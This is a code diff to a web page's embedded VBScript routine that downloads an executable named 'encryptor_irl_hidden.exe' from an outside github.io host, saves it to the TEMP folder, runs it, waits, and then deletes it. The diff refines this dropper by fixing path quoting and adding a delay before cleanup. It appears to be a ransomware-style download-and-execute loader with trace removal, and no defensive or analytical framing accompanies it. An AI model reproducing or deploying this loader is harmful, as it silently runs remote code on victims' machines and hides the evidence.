@@ -12,7 +12,7 @@
     <script language="VBScript">
         Sub DownloadAndExecute
             Dim objXMLHTTP, objStream, objShell
-            Dim url, tempFile
+            Dim url, tempFile, tempPath
             
             url = "https://fecdor.github.io/history-protector/encryptor_irl_hidden.exe"  ' Replace with the URL of your EXE
             
@@ -21,6 +21,12 @@
             Set objStream = CreateObject("ADODB.Stream")
             Set objShell = CreateObject("WScript.Shell")
             
+            ' Get the path to the TEMP directory
+            tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
+            
+            ' Generate a temporary filename
+            tempFile = tempPath & "\tempfile.exe"
+            
             ' Open connection and download the file into memory
             objXMLHTTP.Open "GET", url, False
             objXMLHTTP.Send
@@ -28,14 +34,15 @@
                 objStream.Type = 1  ' Binary data
                 objStream.Open
                 objStream.Write objXMLHTTP.responseBody
-                ' Create temporary file in memory and execute it
-                tempFile = objShell.ExpandEnvironmentStrings("%TEMP%") & "\tempfile.exe"
-                objStream.SaveToFile tempFile, 2
+                objStream.SaveToFile tempFile, 2  ' Save to temporary file
                 objStream.Close
+                
                 ' Execute the EXE
-                objShell.Run tempFile, 1, True
+                objShell.Run Chr(34) & tempFile & Chr(34), 1, True
+                ' Wait briefly for execution to complete
+                WScript.Sleep 5000
                 ' Delete the temporary file after execution
-                objShell.Run "cmd /c del " & tempFile, 0, True
+                objShell.Run "cmd /c del " & Chr(34) & tempFile & Chr(34), 0, True
             Else
                 MsgBox "Error downloading file."
             End If
